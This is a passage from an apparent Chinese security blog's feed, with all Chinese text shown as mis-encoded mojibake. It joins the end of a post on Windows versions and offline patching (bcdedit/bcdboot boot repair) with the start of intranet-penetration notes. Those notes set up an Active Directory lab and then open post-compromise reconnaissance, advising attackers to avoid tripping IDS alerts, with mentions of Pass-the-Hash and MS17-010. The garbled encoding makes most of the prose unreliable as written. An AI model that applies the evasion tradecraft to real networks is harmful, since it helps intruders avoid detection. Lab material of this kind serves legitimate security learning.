align="center">-</td></tr><tr><td align="center">2002å¹´</td><td align="center">NT 5.1</td><td align="center">Windows XP Media Center Edition ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">2600</td></tr><tr><td align="center">2002å¹´</td><td align="center">NT 5.1</td><td align="center">Windows XP TabletPC Edition ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">2600</td></tr><tr><td align="center">2003å¹´</td><td align="center">NT 5.2</td><td align="center">Windows Server 2003 ( å·²åœæ­¢æ”¯æŒäº2015/7/14 )</td><td align="center">3790</td></tr><tr><td align="center">2003å¹´</td><td align="center">NT 5.2</td><td align="center">Windows XP 64-bit Edition ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">2600(v2002),3790(v2003)</td></tr><tr><td align="center">2004å¹´</td><td align="center">CE 5.0</td><td align="center">Windows CE 5.0 ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">1400</td></tr><tr><td align="center">2005å¹´</td><td align="center">NT 5.2</td><td align="center">Windows XP Professional x64 Edition ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">3790</td></tr><tr><td align="center">2005å¹´</td><td align="center">NT 5.2</td><td align="center">Windows Server 2003 x64 Editions ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">3790</td></tr><tr><td align="center">2006å¹´</td><td align="center">NT 5.1</td><td align="center">Windows Fundamentals for Legacy PCs ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">2600</td></tr><tr><td align="center">2006å¹´</td><td align="center">CE 6.0</td><td align="center">Windows Embedded CE 6.0 ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">1937</td></tr><tr><td align="center">2007å¹´</td><td align="center">NT 6.0</td><td align="center">Windows Vista ( å·²åœæ­¢æ”¯æŒäº2017/4/11 )</td><td align="center">6000(RTM),6001(SP1),6002(SP2),6003(SP2 Update)</td></tr><tr><td align="center">2007å¹´</td><td align="center">NT 6.0</td><td align="center">Windows Home Server ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">1500(RTM),1800(PP1),2030(PP2),3436(PP3)</td></tr><tr><td align="center">2008å¹´</td><td align="center">NT 6.0</td><td align="center">Windows Server 2008 ( å·²åœæ­¢æ”¯æŒäº2020/1/14 )</td><td align="center">6001(RTM),6002(SP2),6003(SP2 Update)</td></tr><tr><td align="center">2009å¹´</td><td align="center">NT 6.1</td><td align="center">Windows 7 ( å·²åœæ­¢æ”¯æŒäº2020/1/14 )</td><td align="center">7600(RTM),7601(SP1)</td></tr><tr><td align="center">2009å¹´</td><td align="center">NT 6.1</td><td align="center">Windows Server 2008 R2 ( å·²åœæ­¢æ”¯æŒäº2020/1/14 )</td><td align="center">7600(RTM),7601(SP1)</td></tr><tr><td align="center">2010å¹´</td><td align="center">CE 7.0</td><td align="center">Windows Phone 7 ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">-</td></tr><tr><td align="center">2011å¹´</td><td align="center">CE 7.0</td><td align="center">Windows Embedded Compact 7 ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">-</td></tr><tr><td align="center">2011å¹´</td><td align="center">NT 6.1</td><td align="center">Windows Home Server 2011 ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">8800</td></tr><tr><td align="center">2012å¹´</td><td align="center">NT 6.2</td><td align="center">Windows 8 ( å·²åœæ­¢æ”¯æŒäº2016/1/12 )</td><td align="center">9200</td></tr><tr><td align="center">2012å¹´</td><td align="center">NT 6.2</td><td align="center">Windows RT ( å·²åœæ­¢æ”¯æŒ )</td><td align="center">9200</td></tr><tr><td align="center">2012å¹´</td><td align="center">NT 6.2</td><td align="center">Windows Server 2012 ï¼ˆè‡³2023/1/9åœæ­¢æ”¯æŒï¼‰</td><td align="center">9200</td></tr><tr><td align="center">2012å¹´</td><td align="center">NT 6.2</td><td align="center">Windows Phone 8 ï¼ˆå·²åœæ­¢æ”¯æŒï¼‰</td><td align="center">10322</td></tr><tr><td align="center">2013å¹´</td><td align="center">NT 6.3</td><td align="center">Windows 8.1 ï¼ˆè‡³2023/1/9åœæ­¢æ”¯æŒï¼‰</td><td align="center">9600</td></tr><tr><td align="center">2013å¹´</td><td align="center">NT 6.3</td><td align="center">Windows RT 8.1 ï¼ˆè‡³2023/1/9åœæ­¢æ”¯æŒï¼‰</td><td align="center">9600</td></tr><tr><td align="center">2013å¹´</td><td align="center">NT 6.3</td><td align="center">Windows Server 2012 R2 ï¼ˆè‡³2023/1/9åœæ­¢æ”¯æŒï¼‰</td><td align="center">9600</td></tr><tr><td align="center">2014å¹´</td><td align="center">NT 6.3</td><td align="center">Windows Phone 8.1 ï¼ˆå·²åœæ­¢æ”¯æŒï¼‰</td><td align="center">12307</td></tr><tr><td align="center">2015å¹´</td><td align="center">NT 10.0</td><td align="center">Windows 10 ï¼ˆæ¯ä¸ªå®¶åº­ç‰ˆå’Œä¸“ä¸šç‰ˆæ”¯æŒ1.5å¹´æ¯ä¸ªæ•™è‚²ç‰ˆå’Œä¼ä¸šç‰ˆæ”¯æŒ2.5å¹´) || 10240</td><td align="center"></td></tr><tr><td align="center">2015å¹´</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1511</td><td align="center">10587</td></tr><tr><td align="center">2016å¹´</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1607</td><td align="center">14393</td></tr><tr><td align="center">2017å¹´</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1703</td><td align="center">15063</td></tr><tr><td align="center">2017å¹´</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1709</td><td align="center">16299</td></tr><tr><td align="center">2018å¹´</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1803</td><td align="center">17134</td></tr><tr><td align="center">2018å¹´</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1809</td><td align="center">17763</td></tr><tr><td align="center">2019å¹´</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1903</td><td align="center">18362</td></tr><tr><td align="center">2019å¹´</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1909</td><td align="center">18363</td></tr><tr><td align="center">2020å¹´</td><td align="center">NT 10.0</td><td align="center">Windows 10 v2004</td><td align="center">19041</td></tr><tr><td align="center">2020å¹´</td><td align="center">NT 10.0</td><td align="center">Windows 10 v2009</td><td align="center">19042</td></tr><tr><td align="center">2020å¹´</td><td align="center">NT 10.0</td><td align="center">Windows 10 MN</td><td align="center">19645</td></tr><tr><td align="center">2020å¹´</td><td align="center">NT 10.0</td><td align="center">Windows 10 FE</td><td align="center">20161(æ¯ä¸ªé•¿æœŸæ”¯æŒç‰ˆæœ¬æŠ€æœ¯æ”¯æŒ5å¹´ï¼ŒåŠ ä¸Šæ‰©å±•æ”¯æŒåå…±10å¹´)</td></tr><tr><td align="center">2016å¹´</td><td align="center">NT 10.0</td><td align="center">Windows 10 Mobile (å·²åœæ­¢æ”¯æŒ)</td><td align="center">10240(TH1),10587(TH2),14352(RS1),14822(RS2),16212(RS3)</td></tr><tr><td align="center">2016å¹´</td><td align="center">NT 10.0</td><td align="center">Windows Server 2016 ï¼ˆè‡³2026/10/13åœæ­¢æ”¯æŒï¼‰</td><td align="center"></td></tr><tr><td align="center">2018å¹´</td><td align="center">NT 10.0</td><td align="center">Windows Server 2019 ï¼ˆè‡³2029/1/9åœæ­¢æ”¯æŒï¼‰</td><td align="center"></td></tr></tbody></table><h3 id="Windowsç¼–å·åŒºåˆ«"><a href="#Windowsç¼–å·åŒºåˆ«" class="headerlink" title="Windowsç¼–å·åŒºåˆ«"></a>Windowsç¼–å·åŒºåˆ«</h3><blockquote><h4 id="R2å’Œæ™®é€šç‰ˆæœ¬åŒºåˆ«"><a href="#R2å’Œæ™®é€šç‰ˆæœ¬åŒºåˆ«" class="headerlink" title="R2å’Œæ™®é€šç‰ˆæœ¬åŒºåˆ«"></a>R2å’Œæ™®é€šç‰ˆæœ¬åŒºåˆ«</h4></blockquote><p>æ‹¿Windows Server 2008ç›¸å…³ç‰ˆæœ¬æ¥ä¸¾ä¾‹ï¼ŒWindows Server 2008 æ˜¯ Vista çš„æœåŠ¡å™¨ç‰ˆï¼ŒWindows Server 2008  R2 æ˜¯ Windows 7 çš„æœåŠ¡å™¨ç‰ˆï¼Œä¹Ÿå°±æ˜¯è¯´ä»–ä»¬ä½¿ç”¨çš„å†…æ ¸æ˜¯ä¸ç›¸åŒçš„ï¼Œ<strong>åŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡ç³»ç»Ÿæ˜¯å¦å¸¦R2æ¥åŒºåˆ†æ˜¯å¦æ˜¯Windows Serverç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯è¯´åƒWindows 7ã€Windows 8ã€Windows 10ç­‰æ“ä½œç³»ç»Ÿæ˜¯ä¸å­˜åœ¨æœ‰R2è¿™ç§ç‰ˆæœ¬çš„</strong>ã€‚</p><blockquote><h4 id="SP1ã€SP2ã€SP3ã€SP4åŒºåˆ«"><a href="#SP1ã€SP2ã€SP3ã€SP4åŒºåˆ«" class="headerlink" title="SP1ã€SP2ã€SP3ã€SP4åŒºåˆ«"></a>SP1ã€SP2ã€SP3ã€SP4åŒºåˆ«</h4></blockquote><p>æ‹¿Windows 7ç›¸å…³ç‰ˆæœ¬æ¥ä¸¾ä¾‹ï¼ŒWindows 7æ˜¯æœ€åˆå§‹çš„å‘è¡Œç‰ˆæœ¬ï¼ŒWindows 7 SP1æ˜¯åœ¨Windows 7ç‰ˆæœ¬ä¸Šçš„ä¸€ä¸ªå¢é‡æ›´æ–°ç‰ˆæœ¬ï¼ŒåŒç†SP2ä¹‹ç±»çš„éƒ½æ˜¯ç›¸åŒçš„ã€‚</p><h3 id="Windowsæ›´æ–°"><a href="#Windowsæ›´æ–°" class="headerlink" title="Windowsæ›´æ–°"></a>Windowsæ›´æ–°</h3><blockquote><h4 id="è”ç½‘æ›´æ–°"><a href="#è”ç½‘æ›´æ–°" class="headerlink" title="è”ç½‘æ›´æ–°"></a>è”ç½‘æ›´æ–°</h4></blockquote><p>è¿™ä¸ªç›´æ¥æ›´æ–°å°±è¡Œäº†ç®€å•çš„å¾ˆï¼Œä¸å¤šèµ˜è¿°</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/5.png" alt="image-20201102175224207"></p><blockquote><h4 id="æ— ç½‘ç»œæ›´æ–°"><a href="#æ— ç½‘ç»œæ›´æ–°" class="headerlink" title="æ— ç½‘ç»œæ›´æ–°"></a>æ— ç½‘ç»œæ›´æ–°</h4></blockquote><p>æ¯”å¦‚éœ€è¦å®‰è£…KB4012212è¿™ä¸ªè¡¥ä¸ï¼Œå…ˆå»è¿™ä¸ªç½‘ç«™ä¸­æœç´¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.catalog.update.microsoft.com&#x2F;home.aspx</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/6.png" alt="image-20201102175840970"></p><p>ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°Windows 7æœ‰ä¸¤ä¸ªç‰ˆæœ¬X86å’ŒX64ç‰ˆæœ¬ï¼Œç‚¹è¿›å»å°±èƒ½çœ‹åˆ°å¯¹åº”çš„å¤„ç†å™¨ç‰ˆæœ¬</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/7.png" alt="image-20201102180201399"></p><p>æ¥ç€åªè¦ä¸‹è½½åå®‰è£…å³å¯</p><blockquote><blockquote><h5 id="ç¦»çº¿è¡¥ä¸çš„ä¸€ä¸ªå‘"><a href="#ç¦»çº¿è¡¥ä¸çš„ä¸€ä¸ªå‘" class="headerlink" title="ç¦»çº¿è¡¥ä¸çš„ä¸€ä¸ªå‘"></a>ç¦»çº¿è¡¥ä¸çš„ä¸€ä¸ªå‘</h5></blockquote></blockquote><p>å®‰è£…è¡¥ä¸åæ— æ³•é‡å¯æœåŠ¡å™¨ï¼Œä¸€ç›´è·³åˆ°è¿™ä¸ªç•Œé¢ä¸Šé¢ï¼Œä¸»è¦çš„åŸå› å°±æ˜¯æœºå™¨æ‰¾ä¸åˆ°å¯åŠ¨ä½ç½®äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/10.png" alt="image-20201104152001918"></p><p>é¦–å…ˆæ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼Œç„¶åè¾“å…¥ä¸‹é¢å†…å®¹éƒ¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit &#x2F;enum &#123;default&#125;   #è¿™ä¸€æ­¥è¦æŸ¥çœ‹deviceå±æ€§ï¼Œpartation&#x3D; xxx</span><br><span class="line">bcdboot e:\windows        #æ ¹æ®ä¸Šä¸€æ­¥çš„ç»“æœï¼Œç¡®è®¤xxxæ˜¯å“ªä¸ªç›˜ç¬¦(ä¸€èˆ¬æ˜¯Eç›˜)ï¼Œç„¶åå›è½¦æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/11.png" alt="image-20201104152024338"></p><p>æˆåŠŸåé‡å¯æœºå™¨å³å¯</p><blockquote><h4 id="æ— ç½‘ç»œå¿«é€Ÿæ‰¾è¡¥ä¸"><a href="#æ— ç½‘ç»œå¿«é€Ÿæ‰¾è¡¥ä¸" class="headerlink" title="æ— ç½‘ç»œå¿«é€Ÿæ‰¾è¡¥ä¸"></a>æ— ç½‘ç»œå¿«é€Ÿæ‰¾è¡¥ä¸</h4></blockquote><p>æœ‰ä¸¤ç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§ä¸é€‚ç”¨äºå…¨éƒ¨ç³»ç»Ÿï¼Œæœ‰äº›ç³»ç»Ÿæ²¡åŠæ³•æ‰¾åˆ°ï¼Œç¬¬äºŒç§æ–¹æ³•ä½¿ç”¨ä¸å…¨éƒ¨ç³»ç»Ÿ</p><ul><li><p>é¦–å…ˆä¸‹è½½ä¸ª360å®‰å…¨å«å£«ç¦»çº¿å®‰è£…åŒ…ï¼Œæ¥æœç´¢è¡¥ä¸</p></li><li><p>é€šè¿‡ç‰¹å®šçš„è¯­å¥åœ¨å¾®è½¯è¡¥ä¸ç½‘ç«™æ¥æœç´¢è¡¥ä¸ï¼Œå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2020-é€‚ç”¨äº Windows Server 2019 çš„ 09 æ›´æ–°</span><br><span class="line">#20XX-é€‚ç”¨äº Windows XX çš„ XX æ›´æ–°</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>çº¢è“åŠŸé˜²ç›¸å…³ç¬”è®°æ€»ç»“</title>
    <link href="https://www.ascotbe.com/2020/08/03/IntranetPenetration/"/>
    <id>https://www.ascotbe.com/2020/08/03/IntranetPenetration/</id>
    <published>2020-08-03T13:45:42.000Z</published>
    <updated>2021-06-11T08:48:36.304Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><p>å‰è¨€</p></blockquote><p>æœ¬æ–‡å…¨ç¨‹ç´§è·Ÿjumboå¸ˆå‚…å†™çš„æ–‡ç« æ¥å¤ç°ï¼Œå†…ç½‘å¯¹æˆ‘æ¥è¯´æ˜¯ä¸€ä¸ªæ–°çš„é¢†åŸŸï¼Œæ–‡ç« ä¼šå‚è€ƒå¤šä¸ªå¸ˆå‚…ä¸­çš„åˆ†ææ¥å®Œæˆï¼Œå½“ç„¶æœ‰äº›è‡ªå·±çš„æƒ³æ³•åœ¨é‡Œé¢ï¼Œåç»­å¦‚æœæœ‰æ–°æ€è·¯ä¼šå¾€è¿™é‡Œé¢æ·»åŠ </p><blockquote><p>PS</p></blockquote><p>ç›®å‰å°±å·®å§”æ´¾æ²¡æœ‰å†™äº†</p><h2 id="æ­å»ºåŸŸç¯å¢ƒ"><a href="#æ­å»ºåŸŸç¯å¢ƒ" class="headerlink" title="æ­å»ºåŸŸç¯å¢ƒ"></a>æ­å»ºåŸŸç¯å¢ƒ</h2><blockquote><p>ç¯å¢ƒæ¸…å•</p></blockquote><p>ç”±äºæˆ‘ä»¬éœ€è¦åŸŸç¯å¢ƒæ¨¡æ‹Ÿå¸¸è§„çš„å†…ç½‘ï¼Œæ‰€ä»¥æ­å»ºåŸŸç¯å¢ƒ</p><ul><li>Windows 2008 R2 X64</li><li>Windows 10</li><li>Windows 7 SP1 X64</li></ul><p>Windowséœ€è¦æ‰§è¡Œ<code>set-executionpolicy remotesigned</code>æ¥æ‰“å¼€é»˜è®¤ä¸å…è®¸æ‰§è¡Œpsè„šæœ¬</p><h3 id="é…ç½®é™æ€IP"><a href="#é…ç½®é™æ€IP" class="headerlink" title="é…ç½®é™æ€IP"></a>é…ç½®é™æ€IP</h3><p>ä½ç½®ï¼šç½‘ç»œå’Œå…±äº«ä¸­å¿ƒ-&gt;æœ¬åœ°è¿æ¥-&gt;å±æ€§-&gt;IPV4</p><p>ç„¶åéœ€è¦è®¾ç½®ä¸€ä¸ªDNSæŒ‡å‘æœ¬æœºï¼Œå› ä¸ºå®ƒåé¢æ˜¯ä¸€ä¸ªåŸŸæ§çš„è§’è‰²ï¼ŒIPåœ°å€å¯ä»¥åœ¨è¯¦ç»†ä¿¡æ¯é‡Œé¢çœ‹ï¼Œæœ€å¥½å’Œç°åœ¨ç±»ä¼¼ã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/1.png" alt="image-20200729222159021"></p><h3 id="é…ç½®åŸŸç¯å¢ƒ"><a href="#é…ç½®åŸŸç¯å¢ƒ" class="headerlink" title="é…ç½®åŸŸç¯å¢ƒ"></a>é…ç½®åŸŸç¯å¢ƒ</h3><p>åœ¨æœåŠ¡ç®¡ç†å™¨ä¸­æ·»åŠ è§’è‰²</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/2.png" alt="image-20200729222459835"></p><p>ç„¶åå‹¾é€‰è¿™ä¸ªï¼Œè¿™è¾¹æä¸€å¥åœ¨åˆ›å»ºåŸŸçš„æ—¶å€™è¿˜éœ€è¦æŠŠå½“å‰ç”¨æˆ·è®¾ç½®ä¸ºå¼ºå¯†ç </p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/3.png" alt="image-20200729222546079"></p><p>ç„¶åå°±æ˜¯æ— è„‘ä¸‹ä¸€æ­¥å®‰è£…ï¼Œå°±å¯ä»¥å®‰è£…æˆåŠŸäº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/4.png" alt="image-20200729222646209"></p><p>æ¥ç€æˆ‘ä»¬ç‚¹å¼€è§’è‰²ä½ç½®</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/5.png" alt="image-20200729222814376"></p><p>ä¼šçœ‹åˆ°è¿™ä¸ªæç¤ºï¼Œæˆ‘ä»¬åªè¦ç‚¹å‡»è“è‰²çš„ä½ç½®ä¹Ÿå°±æ˜¯<strong>dcpromo.exe</strong>å°±ä¼šå‡ºæ¥è¿™ä¸ªé¡µé¢</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/6.png" alt="image-20200729222917906"></p><p>ç‚¹å‡»ä¸‹ä¸€æ­¥</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/7.png" alt="image-20200729223024238"></p><p>è¿™è¾¹çœ‹äº†ä¸€ä¸‹å€¾æ—‹å¸ˆå‚…å†™çš„<strong>Windows NT 4.0å…¼å®¹çš„åŠ å¯†ç®—æ³•</strong>ç›¸å…³è¯´æ˜ï¼Œè¿™ä¸ªç®—æ³•æ˜¯ä½ç‰ˆæœ¬çš„SMBv1å®¢æˆ·ç«¯ï¼Œåœ¨è¿›è¡ŒNTLMç½‘ç»œè®¤è¯çš„è¿‡ç¨‹ä¸­é‡‡ç”¨çš„ç®—æ³•è¾ƒä¸ºç®€å•ï¼Œèƒ½å¤Ÿè½»æ˜“ç ´è§£ï¼Œå¹¶ä¸”å¯èƒ½ä¼šå—åˆ°Pass The Hashçš„æŠ€æœ¯æ‰‹æ®µåˆ©ç”¨ã€MS17-010ç­‰æ¼æ´çš„å±å®³ï¼Œç°åœ¨éƒ½æ˜¯SMBv3çš„ç‰ˆæœ¬äº†</p><p>æˆ‘ä»¬ä¸‹ä¸€æ­¥</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/8.png" alt="image-20200729223717033"></p><p>è¿™è¾¹é€‰æ‹©<strong>æ–°æ—</strong>ï¼Œæ—è¡¨ç¤ºå¤šä¸ªåŸŸçš„é›†åˆï¼Œå› ä¸ºæˆ‘ä»¬åªæœ‰ä¸€ä¸ªåŸŸæ‰€ä»¥è¿™è¾¹ç”¨æ–°çš„æ—ã€‚å¦‚æœä½ è®¾ç½®äº†å¯†ç è¿˜æ˜¯æŠ¥é”™è¯´ä½ è´¦æˆ·å¯†ç ä¸ç¬¦åˆè¦æ±‚çš„è¯å°±åœ¨å‘½ä»¤è¡Œé‡Œé¢è¾“å…¥å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator &#x2F;passwordreq:yes</span><br></pre></td></tr></table></figure><p>ç„¶åè¿™è¾¹ä¼šè¦æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªåŸŸåï¼Œæˆ‘è¿™è¾¹å°±å¡«æˆ‘åšå®¢çš„åŸŸåäº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/9.png" alt="image-20200729225803364"></p><p>æ¥ç€ä¸‹ä¸€æ­¥å¯ä»¥çœ‹åˆ°ï¼Œé€‰æ‹©çº§åˆ«ï¼Œæˆ‘ä»¬ç›´æ¥é€‰é»˜è®¤çš„2003</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/10.png" alt="image-20200729225859743"></p><p>ä¸€ç›´ä¸‹ä¸€æ­¥ä¼šå¼¹å‡ºè¿™ä¸ª</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/11.png" alt="image-20200729230152688"></p><p>ç‚¹å‡»æ˜¯</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/12.png" alt="image-20200729230236422"></p><p>ç„¶åè®¾ç½®DCç®¡ç†å‘˜å¯†ç </p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/13.png" alt="image-20200729230312638"></p><p>ä¸‹ä¸€æ­¥åå°±èƒ½çœ‹åˆ°è®¾ç½®å†…å®¹äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/14.png" alt="image-20200729230418827"></p><p>ç„¶åç‚¹å‡»å®Œæˆåé‡å¯ï¼Œè¿™è¾¹ç­‰å°±å¥½äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/15.png" alt="image-20200729230456239"></p><p>é‡å¯åå¯ä»¥çœ‹åˆ°é…ç½®æˆåŠŸäº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/16.png" alt="image-20200729231055590"></p><h3 id="åŠ å…¥äºç¯å¢ƒ"><a href="#åŠ å…¥äºç¯å¢ƒ" class="headerlink" title="åŠ å…¥äºç¯å¢ƒ"></a>åŠ å…¥äºç¯å¢ƒ</h3><p>æ¥ç€æˆ‘ä»¬æ‰“å¼€å‡†å¤‡å¥½çš„Windows 10æ¥pingä¸‹åŸŸIPæ˜¯å¦èƒ½é€š</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/17.png" alt="image-20200729231256289"></p><p>ç„¶ç„¶åå°†å½“å‰ä¸»æœºçš„DNSæœåŠ¡å™¨è®¾ç½®ä¸ºDCçš„IP</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/18.png" alt="image-20200729231448959"></p><p>ç„¶åpingä¸‹æˆ‘ä»¬çš„åŸŸ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/19.png" alt="image-20200729231549287"></p><p>æ¥ç€æ‰¾åˆ°ç³»ç»Ÿå±æ€§</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/20.png" alt="image-20200729231932391"></p><p>ç‚¹å‡»ç½‘ç»œ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/21.png" alt="image-20200729231951186"></p><p>ç‚¹å‡»ä¸‹ä¸€æ­¥</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/22.png" alt="image-20200729232030994"></p><p>ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œç„¶ååˆ°è¿™ä¸ªé¡µé¢ï¼Œæˆ‘ä»¬å¡«ä¸Šç”¨æˆ·åï¼Œç„¶åå…ˆä¸è¦ç‚¹å‡»ä¸‹ä¸€æ­¥</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/23.png" alt="image-20200729234534909"></p><p>æˆ‘ä»¬åˆ‡æ¢åˆ°windows 2008é‚£å°åŸŸæ§é‡Œé¢ï¼Œæ–°å»ºä¸€ä¸ªç”¨æˆ·</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/24.png" alt="image-20200729232339467"></p><p>ç„¶åå¡«å†™ç”¨æˆ·å</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/25.png" alt="image-20200729234417477"></p><p>ä¸‹ä¸€æ­¥åå¡«å†™å¯†ç </p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/26.png" alt="image-20200729232533961"></p><p>ç„¶åæˆ‘ä»¬å›åˆ°Windows 10ï¼Œå¡«ä¸Šæˆ‘ä»¬è®¾ç½®å¥½çš„å¯†ç ï¼Œå’ŒåŸŸå</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/27.png" alt="image-20200729234508295"></p><p>è¿™è¾¹å¯èƒ½ä¼šæŠ¥é”™è¯´åŸŸä¸åŒï¼Œå…·ä½“æŒ‰ä¸Šé¢å†™çš„ä¿¡æ¯æ¥å¡«å°±èƒ½åˆ°è¿™ä¸€æ­¥</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/28.png" alt="image-20200729234734276"></p><p>ç„¶åç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œé€‰ç€<strong>Users</strong>æƒé™</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/29.png" alt="image-20200729234817121"></p><p>ä¸‹ä¸€æ­¥åé‡å¯å®Œå°±è¡Œäº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/30.png" alt="image-20200729234940152"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨åŸŸç¯å¢ƒä¸‹å¹¶ä¸”èƒ½ä¸Šç½‘äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/31.png" alt="image-20200729235153363"></p><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>åœ¨æ”»é™·ä¸€å°æœºå™¨åï¼Œä¸è¦ä¸€å‘³çš„ç›´æ¥å»æŠ“å–æœºå™¨å¯†ç ã€å»åšä¸€äº›æ‰«æå†…ç½‘çš„æ“ä½œï¼Œå› ä¸ºå¦‚æœç½‘å†…æœ‰IDSç­‰å®‰å…¨è®¾å¤‡ï¼Œæœ‰å¯èƒ½ä¼šé€ æˆæŠ¥è­¦ï¼Œä¸¢å¤±æƒé™ã€‚</p><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>è¿™ä¸ªä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦ï¼Œè°·æ­Œäº†ä¸€ä¸‹ï¼Œè¿™è¾¹ç›´æ¥é¥®ç”¨å®˜æ–¹ä»‹ç»ã€‚SPN æ˜¯æœåŠ¡åœ¨ä½¿ç”¨ Kerberos èº«ä»½éªŒè¯çš„ç½‘ç»œä¸Šçš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œå®ƒç”±æœåŠ¡ç±»ã€ä¸»æœºåå’Œç«¯å£ç»„æˆã€‚åœ¨ä½¿ç”¨ Kerberos èº«ä»½éªŒè¯çš„ç½‘ç»œä¸­ï¼Œå¿…é¡»åœ¨å†…ç½®è®¡ç®—æœºå¸æˆ·ï¼ˆå¦‚ NetworkService æˆ– 